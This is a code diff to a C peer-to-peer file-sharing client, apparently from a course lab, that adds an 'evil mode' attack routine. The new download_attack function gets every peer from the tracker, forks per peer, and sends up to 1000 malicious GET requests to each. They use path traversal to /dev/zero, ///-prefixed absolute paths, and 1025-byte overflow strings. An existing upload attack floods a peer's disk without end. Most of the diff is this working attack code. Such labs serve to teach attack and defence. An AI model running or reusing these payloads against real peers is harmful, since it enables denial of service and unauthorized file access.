@@ -32,6 +32,8 @@ static int listen_port;
 //#define MAXFILESIZ 2147483648; //Defined as 2GB which is the max size allowed by most systems
 #define MAXFILESIZ 104857600 //Defined as 100 MiB
 
+// Evil attack limit before forfeiting 
+#define MAX_NUM_ATTACK_ATTEMPTS	1000
 
 /*****************************************************************************
  * TASK STRUCTURE
@@ -468,14 +470,23 @@ task_t *start_download(task_t *tracker_task, const char *filename)
 	peer_t *p;
 	size_t messagepos;
 	assert(tracker_task->type == TASK_TRACKER);
-
+	
 	message("* Finding peers for '%s'\n", filename);
-
-	osp2p_writef(tracker_task->peer_fd, "WANT %s\n", filename);
+	
+	// make filename null b/c we're going to grab all peers so specific file unnecessary
+	if (evil_mode)
+		filename = "";
+		
+	// attack connected peers
+	if (evil_mode)
+		osp2p_writef(tracker_task->peer_fd, "WHO %s\n", filename);
+	else
+		osp2p_writef(tracker_task->peer_fd, "WANT %s\n", filename);
+	
 	messagepos = read_tracker_response(tracker_task);
 	if (tracker_task->buf[messagepos] != '2') {
 		error("* Tracker error message while requesting '%s':\n%s",
-		      filename, &tracker_task->buf[messagepos]);
+		      (evil_mode ? "all peers as victims" : filename), &tracker_task->buf[messagepos]);
 		goto exit;
 	}
 
@@ -500,13 +511,13 @@ task_t *start_download(task_t *tracker_task, const char *filename)
 	s1 = tracker_task->buf;
 	while ((s2 = memchr(s1, '\n', (tracker_task->buf + messagepos) - s1))) {
 		if (!(p = parse_peer(s1, s2 - s1)))
-			die("osptracker responded to WANT command with unexpected format!\n");
+			die("osptracker responded to %s command with unexpected format!\n", (evil_mode ? "WHO" : "WANT"));
 		p->next = t->peer_list;
 		t->peer_list = p;
 		s1 = s2 + 1;
 	}
 	if (s1 != tracker_task->buf + messagepos)
-		die("osptracker's response to WANT has unexpected format!\n");
+		die("osptracker's response to %s has unexpected format!\n", (evil_mode ? "WHO" : "WANT"));
 
  exit:
 	return t;
@@ -746,7 +757,7 @@ static void task_upload(task_t *t)
 		goto exit;
 	}
 	//End 2B Code
-
+	
 	t->disk_fd = open(t->filename, O_RDONLY);
 	if (t->disk_fd == -1) {
 		error("* Cannot open file %s", t->filename);
@@ -758,7 +769,8 @@ static void task_upload(task_t *t)
 	int ret = 0;
 	
 	// Exercise 3 - Overrun disk
-	if (evil_mode){
+	if (evil_mode)
+	{
 		message("* Attack with a disk overrun.\n");
 		while (1) {
 			ret = osp2p_writef(t->peer_fd, "Cat1,Cat2,Cat3,Cat4.");
@@ -799,6 +811,98 @@ static void task_upload(task_t *t)
 
     exit:
 	task_free(t);
+}
+
+// this is where the evil happens
+void download_attack(task_t *tracker_task)
+{
+	task_t *t = start_download(tracker_task, NULL);
+
+	if (t == NULL)
+	{
+		error("* Error: Can't get list of prey - now trying upload attack");
+		return;
+	}
+
+	while (t->peer_list != NULL)
+	{
+		pid_t pid;
+		int num_attacks = 0;
+
+		if (t->peer_list->addr.s_addr == listen_addr.s_addr && t->peer_list->port == listen_port)
+			continue;
+
+		if ((pid = fork()) < 0)
+		{
+			error("* Can't fork to attack");
+			task_free(t);
+			return;
+		}
+
+		if (pid > 0)
+		{
+			task_pop_peer(t);
+			continue;
+		}
+
+		message("* Attack %s:%d\n", inet_ntoa(t->peer_list->addr), t->peer_list->port);
+		srand(time(NULL));
+
+		while (num_attacks < MAX_NUM_ATTACK_ATTEMPTS)
+		{
+			t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+
+			if (t->peer_fd == -1)
+			{
+				message("* Can't open a socket to %s, %d\n", inet_ntoa(t->peer_list->addr), t->peer_list->port);
+				task_free(t);
+				exit(1);
+			}
+			// randomly select and connect a peer and a path and run GET
+			switch(rand() % 4)
+			{
+				case 0:
+					// /////////dev/zero will be read as an absolute path
+					osp2p_writef(t->peer_fd, "GET %s OSP2P\n", "/////////dev/zero");
+					break;
+				case 1:
+					// provide path to /dev/zero
+					osp2p_writef(t->peer_fd, "GET %s OSP2P\n", "../../../../../../../../dev/zero");
+					break;
+				case 2:
+				{
+					// make a large path to cause buffer overflow
+					// 1025 > 1024 for *2 boundary for larger buffer size
+					const size_t size = 1025;
+					char evil_buffer[size + 1];
+					memset(evil_buffer, 'a', size);
+					evil_buffer[size] = '\0';
+
+					osp2p_writef(t->peer_fd, "GET %s OSP2P\n", evil_buffer);
+					break;
+				}
+				case 3:
+				default:
+				{
+					// Make large path for buffer overflow filled with null byte
+					const size_t size = 1025;
+					char evil_buffer[size + 1];
+					memset(evil_buffer, '\0', size);
+
+					osp2p_writef(t->peer_fd, "GET ");
+					write(t->peer_fd, evil_buffer, size);
+					osp2p_writef(t->peer_fd, " OSP2P\n");
+					break;
+				}
+			}
+
+			close(t->peer_fd);
+			num_attacks++;
+		}
+
+		message("* Tried attacking %s:%d\n", inet_ntoa(t->peer_list->addr), t->peer_list->port);
+		exit(0);
+	}
 }
 
 
@@ -885,31 +989,9 @@ int main(int argc, char *argv[])
 	register_files(tracker_task, myalias);
 	prev_task = NULL;
 
-	//WHAT DOES THIS CODE EVEN DO VIR? Im confused lol
-	// Exercise 3 - Begin downloader attacks in concurrent processes
-	if (evil_mode == 1 || evil_mode == 2) 
-	{
-		strncpy(file, "cat0.jpg", 8);
-		file[8] = '\0';
-		// iterate through all three test files
-		for (i = 1; i <= 3; i++) 
-		{
-			file[3]++;
-			if ((t = start_download(tracker_task, file))) 
-			{
-				pid = fork();
-				if (pid == 0) 
-				{
-					task_download(t, tracker_task);
-					exit(0);
-				}
-				else if (pid < 0)
-					error("* Fork error while starting downloader attack.\n");
-			}
-		}
-	}
-	//End 3 Code
-
+	if (evil_mode)
+		download_attack(tracker_task);
+	
 	// First, download files named on command line.
 	//Exercise 1 - Parallel Downloads
 	for (; argc > 1; argc--, argv++){
